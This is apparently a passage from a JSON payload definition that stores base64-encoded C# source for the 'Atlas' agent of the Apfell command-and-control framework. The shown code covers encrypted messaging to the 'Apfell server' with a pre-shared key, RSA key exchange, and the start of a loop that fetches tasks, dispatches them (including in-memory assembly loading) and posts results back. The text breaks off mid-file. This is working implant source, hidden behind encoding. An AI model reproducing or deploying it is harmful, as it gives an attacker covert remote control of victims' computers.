lWKTsNCg0KICAgICAgICAgICAgICAgIHVzaW5nIChNZW1vcnlTdHJlYW0gZW5jcnlwdE1lbVN0cmVhbSA9IG5ldyBNZW1vcnlTdHJlYW0oKSkNCiAgICAgICAgICAgICAgICB1c2luZyAoQ3J5cHRvU3RyZWFtIGVuY3J5cHRDcnlwdG9TdHJlYW0gPSBuZXcgQ3J5cHRvU3RyZWFtKGVuY3J5cHRNZW1TdHJlYW0sIGVuY3J5cHRvciwgQ3J5cHRvU3RyZWFtTW9kZS5Xcml0ZSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB1c2luZyAoU3RyZWFtV3JpdGVyIGVuY3J5cHRTdHJlYW1Xcml0ZXIgPSBuZXcgU3RyZWFtV3JpdGVyKGVuY3J5cHRDcnlwdG9TdHJlYW0pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5jcnlwdFN0cmVhbVdyaXRlci5Xcml0ZShwbGFpbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAvLyBXZSBuZWVkIHRvIHNlbmQgdXVpZDppdjpjaXBoZXJ0ZXh0OmhtYWMNCiAgICAgICAgICAgICAgICAgICAgLy8gQ29uY2F0IGl2OmNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGVuY3J5cHRlZCA9IGFlcy5JVi5Db25jYXQoZW5jcnlwdE1lbVN0cmVhbS5Ub0FycmF5KCkpLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgSE1BQ1NIQTI1NiBzaGEyNTYgPSBuZXcgSE1BQ1NIQTI1NihDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzaykpOw0KICAgICAgICAgICAgICAgICAgICAvLyBBdHRhY2ggaG1hYyB0byBpdjpjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBobWFjID0gc2hhMjU2LkNvbXB1dGVIYXNoKGVuY3J5cHRlZCk7DQogICAgICAgICAgICAgICAgICAgIC8vIEF0dGFjaCB1dWlkIHRvIGl2OmNpcGhlcnRleHQ6aG1hYw0KI2lmIChERUZBVUxUX0VLRSB8fCBIVFRQX0VLRSkNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcudGVtcFVVSUQpLkNvbmNhdChlbmNyeXB0ZWQuQ29uY2F0KGhtYWMpLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KI2Vsc2UNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuUGF5bG9hZFVVSUQpLkNvbmNhdChlbmNyeXB0ZWQuQ29uY2F0KGhtYWMpLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgICAgIC8vIFJldHVybiBiYXNlNjQgZW5jb2RlZCBjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGZpbmFsKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLy8gPHN1bW1hcnk+DQogICAgICAgIC8vLyBFbmNyeXB0IGFueSBnaXZlbiBwbGFpbnRleHQgd2l0aCB0aGUgUFNLIGdpdmVuDQogICAgICAgIC8vLyB0byB0aGUgYWdlbnQuDQogICAgICAgIC8vLyA8L3N1bW1hcnk+DQogICAgICAgIC8vLyA8cGFyYW0gbmFtZT0icGxhaW50ZXh0Ij5QbGFpbnRleHQgdG8gZW5jcnlwdC48L3BhcmFtPg0KICAgICAgICAvLy8gPHJldHVybnM+RW5yeXB0ZWQgc3RyaW5nLjwvcmV0dXJucz4NCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgRW5jcnlwdChzdHJpbmcgcGxhaW50ZXh0KQ0KICAgICAgICB7DQogICAgICAgICAgICB1c2luZyAoQWVzIGFlcyA9IEFlcy5DcmVhdGUoKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBVc2Ugb3VyIFBTSyAoZ2VuZXJhdGVkIGluIEFwZmVsbCBwYXlsb2FkIGNvbmZpZykgYXMgdGhlIEFFUyBrZXkNCiAgICAgICAgICAgICAgICBhZXMuS2V5ID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spOw0KICAgICAgICAgICAgICAgIGFlcy5QYWRkaW5nID0gUGFkZGluZ01vZGUuUEtDUzc7DQogICAgICAgICAgICAgICAgSUNyeXB0b1RyYW5zZm9ybSBlbmNyeXB0b3IgPSBhZXMuQ3JlYXRlRW5jcnlwdG9yKGFlcy5LZXksIGFlcy5JVik7DQoNCiAgICAgICAgICAgICAgICB1c2luZyAoTWVtb3J5U3RyZWFtIGVuY3J5cHRNZW1TdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICAgICAgdXNpbmcgKENyeXB0b1N0cmVhbSBlbmNyeXB0Q3J5cHRvU3RyZWFtID0gbmV3IENyeXB0b1N0cmVhbShlbmNyeXB0TWVtU3RyZWFtLCBlbmNyeXB0b3IsIENyeXB0b1N0cmVhbU1vZGUuV3JpdGUpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKFN0cmVhbVdyaXRlciBlbmNyeXB0U3RyZWFtV3JpdGVyID0gbmV3IFN0cmVhbVdyaXRlcihlbmNyeXB0Q3J5cHRvU3RyZWFtKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuY3J5cHRTdHJlYW1Xcml0ZXIuV3JpdGUocGxhaW50ZXh0KTsNCiAgICAgICAgICAgICAgICAgICAgLy8gV2UgbmVlZCB0byBzZW5kIHV1aWQ6aXY6Y2lwaGVydGV4dDpobWFjDQogICAgICAgICAgICAgICAgICAgIC8vIENvbmNhdCBpdjpjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBlbmNyeXB0ZWQgPSBhZXMuSVYuQ29uY2F0KGVuY3J5cHRNZW1TdHJlYW0uVG9BcnJheSgpKS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgIEhNQUNTSEEyNTYgc2hhMjU2ID0gbmV3IEhNQUNTSEEyNTYoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gQXR0YWNoIGhtYWMgdG8gaXY6Y2lwaGVydGV4dA0KICAgICAgICAgICAgICAgICAgICBieXRlW10gaG1hYyA9IHNoYTI1Ni5Db21wdXRlSGFzaChlbmNyeXB0ZWQpOw0KICAgICAgICAgICAgICAgICAgICAvLyBBdHRhY2ggdXVpZCB0byBpdjpjaXBoZXJ0ZXh0OmhtYWMNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCkuQ29uY2F0KGVuY3J5cHRlZC5Db25jYXQoaG1hYykuVG9BcnJheSgpKS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgIC8vIFJldHVybiBiYXNlNjQgZW5jb2RlZCBjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGZpbmFsKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLy8gPHN1bW1hcnk+DQogICAgICAgIC8vLyBEZWNyeXB0IGEgc3RyaW5nIHdoaWNoIGhhcyBiZWVuIGVuY3J5cHRlZCB3aXRoIHRoZSBQU0suDQogICAgICAgIC8vLyA8L3N1bW1hcnk+DQogICAgICAgIC8vLyA8cGFyYW0gbmFtZT0iZW5jcnlwdGVkIj5UaGUgZW5jcnlwdGVkIHN0cmluZy48L3BhcmFtPg0KICAgICAgICAvLy8gPHJldHVybnM+PC9yZXR1cm5zPg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBEZWNyeXB0KHN0cmluZyBlbmNyeXB0ZWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBpbnB1dCA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNyeXB0ZWQpOw0KDQogICAgICAgICAgICBpbnQgdXVpZExlbmd0aCA9IENvbmZpZy5QYXlsb2FkVVVJRC5MZW5ndGg7DQogICAgICAgICAgICAvLyBJbnB1dCBpcyB1dWlkOml2OmNpcGhlcnRleHQ6aG1hYywgSVYgaXMgMTYgYnl0ZXMNCiAgICAgICAgICAgIGJ5dGVbXSB1dWlkSW5wdXQgPSBuZXcgYnl0ZVt1dWlkTGVuZ3RoXTsNCiAgICAgICAgICAgIEFycmF5LkNvcHkoaW5wdXQsIHV1aWRJbnB1dCwgdXVpZExlbmd0aCk7DQoNCiAgICAgICAgICAgIGJ5dGVbXSBJViA9IG5ldyBieXRlWzE2XTsNCiAgICAgICAgICAgIEFycmF5LkNvcHkoaW5wdXQsIHV1aWRMZW5ndGgsIElWLCAwLCAxNik7DQoNCiAgICAgICAgICAgIGJ5dGVbXSBjaXBoZXJ0ZXh0ID0gbmV3IGJ5dGVbaW5wdXQuTGVuZ3RoIC0gdXVpZExlbmd0aCAtIDE2IC0gMzJdOw0KICAgICAgICAgICAgQXJyYXkuQ29weShpbnB1dCwgdXVpZExlbmd0aCArIDE2LCBjaXBoZXJ0ZXh0LCAwLCBjaXBoZXJ0ZXh0Lkxlbmd0aCk7DQoNCiAgICAgICAgICAgIEhNQUNTSEEyNTYgc2hhMjU2ID0gbmV3IEhNQUNTSEEyNTYoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spKTsNCiAgICAgICAgICAgIGJ5dGVbXSBobWFjID0gbmV3IGJ5dGVbMzJdOw0KICAgICAgICAgICAgQXJyYXkuQ29weShpbnB1dCwgdXVpZExlbmd0aCArIDE2ICsgY2lwaGVydGV4dC5MZW5ndGgsIGhtYWMsIDAsIDMyKTsNCg0KICAgICAgICAgICAgaWYgKENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoaG1hYykgPT0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhzaGEyNTYuQ29tcHV0ZUhhc2goSVYuQ29uY2F0KGNpcGhlcnRleHQpLlRvQXJyYXkoKSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHVzaW5nIChBZXMgYWVzID0gQWVzLkNyZWF0ZSgpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVXNlIG91ciBQU0sgKGdlbmVyYXRlZCBpbiBBcGZlbGwgcGF5bG9hZCBjb25maWcpIGFzIHRoZSBBRVMga2V5DQogICAgICAgICAgICAgICAgICAgIGFlcy5LZXkgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzayk7DQogICAgICAgICAgICAgICAgICAgIGFlcy5QYWRkaW5nID0gUGFkZGluZ01vZGUuUEtDUzc7DQogICAgICAgICAgICAgICAgICAgIElDcnlwdG9UcmFuc2Zvcm0gZGVjcnlwdG9yID0gYWVzLkNyZWF0ZURlY3J5cHRvcihhZXMuS2V5LCBJVik7DQoNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKE1lbW9yeVN0cmVhbSBkZWNyeXB0TWVtU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbShjaXBoZXJ0ZXh0KSkNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKENyeXB0b1N0cmVhbSBkZWNyeXB0Q3J5cHRvU3RyZWFtID0gbmV3IENyeXB0b1N0cmVhbShkZWNyeXB0TWVtU3RyZWFtLCBkZWNyeXB0b3IsIENyeXB0b1N0cmVhbU1vZGUuUmVhZCkpDQogICAgICAgICAgICAgICAgICAgIHVzaW5nIChTdHJlYW1SZWFkZXIgZGVjcnlwdFN0cmVhbVJlYWRlciA9IG5ldyBTdHJlYW1SZWFkZXIoZGVjcnlwdENyeXB0b1N0cmVhbSkpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBkZWNyeXB0ZWQgPSBkZWNyeXB0U3RyZWFtUmVhZGVyLlJlYWRUb0VuZCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gUmV0dXJuIGRlY3J5cHRlZCBtZXNzYWdlIGZyb20gQXBmZWxsIHNlcnZlcg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEVuY29kaW5nLlVURjguR2V0U3RyaW5nKHV1aWRJbnB1dCkgKyBkZWNyeXB0ZWQ7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQojZW5kaWYNCiNpZiAoREVGQVVMVF9FS0UgfHwgSFRUUF9FS0UpDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBHZW5Sc2FLZXlzKCkNCiAgICAgICAgew0KDQogICAgICAgICAgICBDb25maWcuUnNhID0gbmV3IFJTQUNyeXB0b1NlcnZpY2VQcm92aWRlcig0MDk2KSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBQZXJzaXN0S2V5SW5Dc3AgPSBmYWxzZQ0KICAgICAgICAgICAgfTsNCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIFJzYURlY3J5cHQoYnl0ZVtdIERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIENvbmZpZy5Sc2EuSW1wb3J0UGFyYW1ldGVycyhDb25maWcuUnNhLkV4cG9ydFBhcmFtZXRlcnModHJ1ZSkpOw0KICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gQ29uZmlnLlJzYS5EZWNyeXB0KERhdGEsIHRydWUpOw0KICAgICAgICAgICAgcmV0dXJuIGZpbmFsOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0UHViS2V5KCkNCiAgICAgICAgew0KICAgICAgICAgICAgU3RyaW5nV3JpdGVyIG91dFN0cmVhbSA9IG5ldyBTdHJpbmdXcml0ZXIoKTsNCiAgICAgICAgICAgIEV4cG9ydFB1YmxpY0tleShDb25maWcuUnNhLCBvdXRTdHJlYW0pOw0KICAgICAgICAgICAgcmV0dXJuIENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhvdXRTdHJlYW0uVG9TdHJpbmcoKSkpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjg0MDY4ODgvYy1zaGFycC1yc2EtcHVibGljLWtleS1vdXRwdXQtbm90LWNvcnJlY3QvMjg0MDc2OTMjMjg0MDc2OTMNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBFeHBvcnRQdWJsaWNLZXkoUlNBQ3J5cHRvU2VydmljZVByb3ZpZGVyIGNzcCwgVGV4dFdyaXRlciBvdXRwdXRTdHJlYW0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYXJhbWV0ZXJzID0gY3NwLkV4cG9ydFBhcmFtZXRlcnMoZmFsc2UpOw0KICAgICAgICAgICAgdXNpbmcgKHZhciBzdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHdyaXRlciA9IG5ldyBCaW5hcnlXcml0ZXIoc3RyZWFtKTsNCiAgICAgICAgICAgICAgICB3cml0ZXIuV3JpdGUoKGJ5dGUpMHgzMCk7IC8vIFNFUVVFTkNFDQogICAgICAgICAgICAgICAgdXNpbmcgKHZhciBpbm5lclN0cmVhbSA9IG5ldyBNZW1vcnlTdHJlYW0oKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBpbm5lcldyaXRlciA9IG5ldyBCaW5hcnlXcml0ZXIoaW5uZXJTdHJlYW0pOw0KICAgICAgICAgICAgICAgICAgICBpbm5lcldyaXRlci5Xcml0ZSgoYnl0ZSkweDMwKTsgLy8gU0VRVUVOQ0UNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCAxMyk7DQogICAgICAgICAgICAgICAgICAgIGlubmVyV3JpdGVyLldyaXRlKChieXRlKTB4MDYpOyAvLyBPQkpFQ1QgSURFTlRJRklFUg0KICAgICAgICAgICAgICAgICAgICB2YXIgcnNhRW5jcnlwdGlvbk9pZCA9IG5ldyBieXRlW10geyAweDJhLCAweDg2LCAweDQ4LCAweDg2LCAweGY3LCAweDBkLCAweDAxLCAweDAxLCAweDAxIH07DQogICAgICAgICAgICAgICAgICAgIEVuY29kZUxlbmd0aChpbm5lcldyaXRlciwgcnNhRW5jcnlwdGlvbk9pZC5MZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICBpbm5lcldyaXRlci5Xcml0ZShyc2FFbmNyeXB0aW9uT2lkKTsNCiAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwNSk7IC8vIE5VTEwNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCAwKTsNCiAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwMyk7IC8vIEJJVCBTVFJJTkcNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKHZhciBiaXRTdHJpbmdTdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiaXRTdHJpbmdXcml0ZXIgPSBuZXcgQmluYXJ5V3JpdGVyKGJpdFN0cmluZ1N0cmVhbSk7DQogICAgICAgICAgICAgICAgICAgICAgICBiaXRTdHJpbmdXcml0ZXIuV3JpdGUoKGJ5dGUpMHgwMCk7IC8vICMgb2YgdW51c2VkIGJpdHMNCiAgICAgICAgICAgICAgICAgICAgICAgIGJpdFN0cmluZ1dyaXRlci5Xcml0ZSgoYnl0ZSkweDMwKTsgLy8gU0VRVUVOQ0UNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzaW5nICh2YXIgcGFyYW1zU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBwYXJhbXNXcml0ZXIgPSBuZXcgQmluYXJ5V3JpdGVyKHBhcmFtc1N0cmVhbSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5jb2RlSW50ZWdlckJpZ0VuZGlhbihwYXJhbXNXcml0ZXIsIHBhcmFtZXRlcnMuTW9kdWx1cyk7IC8vIE1vZHVsdXMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmNvZGVJbnRlZ2VyQmlnRW5kaWFuKHBhcmFtc1dyaXRlciwgcGFyYW1ldGVycy5FeHBvbmVudCk7IC8vIEV4cG9uZW50DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcmFtc0xlbmd0aCA9IChpbnQpcGFyYW1zU3RyZWFtLkxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoYml0U3RyaW5nV3JpdGVyLCBwYXJhbXNMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJpdFN0cmluZ1dyaXRlci5Xcml0ZShwYXJhbXNTdHJlYW0uR2V0QnVmZmVyKCksIDAsIHBhcmFtc0xlbmd0aCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYml0U3RyaW5nTGVuZ3RoID0gKGludCliaXRTdHJpbmdTdHJlYW0uTGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKGlubmVyV3JpdGVyLCBiaXRTdHJpbmdMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW5uZXJXcml0ZXIuV3JpdGUoYml0U3RyaW5nU3RyZWFtLkdldEJ1ZmZlcigpLCAwLCBiaXRTdHJpbmdMZW5ndGgpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHZhciBsZW5ndGggPSAoaW50KWlubmVyU3RyZWFtLkxlbmd0aDsNCiAgICAgICAgICAgICAgICAgICAgRW5jb2RlTGVuZ3RoKHdyaXRlciwgbGVuZ3RoKTsNCiAgICAgICAgICAgICAgICAgICAgd3JpdGVyLldyaXRlKGlubmVyU3RyZWFtLkdldEJ1ZmZlcigpLCAwLCBsZW5ndGgpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHZhciBiYXNlNjQgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKHN0cmVhbS5HZXRCdWZmZXIoKSwgMCwgKGludClzdHJlYW0uTGVuZ3RoKS5Ub0NoYXJBcnJheSgpOw0KICAgICAgICAgICAgICAgIG91dHB1dFN0cmVhbS5Xcml0ZUxpbmUoIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tIik7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBiYXNlNjQuTGVuZ3RoOyBpICs9IDY0KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgb3V0cHV0U3RyZWFtLldyaXRlTGluZShiYXNlNjQsIGksIE1hdGguTWluKDY0LCBiYXNlNjQuTGVuZ3RoIC0gaSkpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBvdXRwdXRTdHJlYW0uV3JpdGVMaW5lKCItLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRW5jb2RlTGVuZ3RoKEJpbmFyeVdyaXRlciBzdHJlYW0sIGludCBsZW5ndGgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChsZW5ndGggPCAwKSB0aHJvdyBuZXcgQXJndW1lbnRPdXRPZlJhbmdlRXhjZXB0aW9uKCJsZW5ndGgiLCAiTGVuZ3RoIG11c3QgYmUgbm9uLW5lZ2F0aXZlIik7DQogICAgICAgICAgICBpZiAobGVuZ3RoIDwgMHg4MCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBTaG9ydCBmb3JtDQogICAgICAgICAgICAgICAgc3RyZWFtLldyaXRlKChieXRlKWxlbmd0aCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gTG9uZyBmb3JtDQogICAgICAgICAgICAgICAgdmFyIHRlbXAgPSBsZW5ndGg7DQogICAgICAgICAgICAgICAgdmFyIGJ5dGVzUmVxdWlyZWQgPSAwOw0KICAgICAgICAgICAgICAgIHdoaWxlICh0ZW1wID4gMCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRlbXAgPj49IDg7DQogICAgICAgICAgICAgICAgICAgIGJ5dGVzUmVxdWlyZWQrKzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyZWFtLldyaXRlKChieXRlKShieXRlc1JlcXVpcmVkIHwgMHg4MCkpOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSBieXRlc1JlcXVpcmVkIC0gMTsgaSA+PSAwOyBpLS0pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpKGxlbmd0aCA+PiAoOCAqIGkpICYgMHhmZikpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHByaXZhdGUgc3RhdGljIHZvaWQgRW5jb2RlSW50ZWdlckJpZ0VuZGlhbihCaW5hcnlXcml0ZXIgc3RyZWFtLCBieXRlW10gdmFsdWUsIGJvb2wgZm9yY2VVbnNpZ25lZCA9IHRydWUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmVhbS5Xcml0ZSgoYnl0ZSkweDAyKTsgLy8gSU5URUdFUg0KICAgICAgICAgICAgdmFyIHByZWZpeFplcm9zID0gMDsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdmFsdWUuTGVuZ3RoOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHZhbHVlW2ldICE9IDApIGJyZWFrOw0KICAgICAgICAgICAgICAgIHByZWZpeFplcm9zKys7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAodmFsdWUuTGVuZ3RoIC0gcHJlZml4WmVyb3MgPT0gMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoc3RyZWFtLCAxKTsNCiAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpMCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKGZvcmNlVW5zaWduZWQgJiYgdmFsdWVbcHJlZml4WmVyb3NdID4gMHg3ZikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIC8vIEFkZCBhIHByZWZpeCB6ZXJvIHRvIGZvcmNlIHVuc2lnbmVkIGlmIHRoZSBNU0IgaXMgMQ0KICAgICAgICAgICAgICAgICAgICBFbmNvZGVMZW5ndGgoc3RyZWFtLCB2YWx1ZS5MZW5ndGggLSBwcmVmaXhaZXJvcyArIDEpOw0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUoKGJ5dGUpMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEVuY29kZUxlbmd0aChzdHJlYW0sIHZhbHVlLkxlbmd0aCAtIHByZWZpeFplcm9zKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IHByZWZpeFplcm9zOyBpIDwgdmFsdWUuTGVuZ3RoOyBpKyspDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJlYW0uV3JpdGUodmFsdWVbaV0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KI2VuZGlmDQogICAgfQ0KfQ0K"
        },
        {
          "Utils.cs": "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9uczsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLkxpbnE7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBVdGlscw0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIExvb3AoSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIUNoZWNrRGF0ZSgpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEVudmlyb25tZW50LkV4aXQoMSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBIdHRwLkdldFRhc2tpbmcoSm9iTGlzdCk7DQogICAgICAgICAgICBEaXNwYXRjaChKb2JMaXN0KTsNCiAgICAgICAgICAgIEh0dHAuUG9zdFJlc3BvbnNlKEpvYkxpc3QpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIERpc3BhdGNoIChKb2JMaXN0IEpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKEpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFKb2Iuam9iX3N0YXJ0ZWQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAibG9hZGFzc2VtYmx5IikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSA9PSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyZWFkIHRocmVhZCA9IG5ldyBUaHJl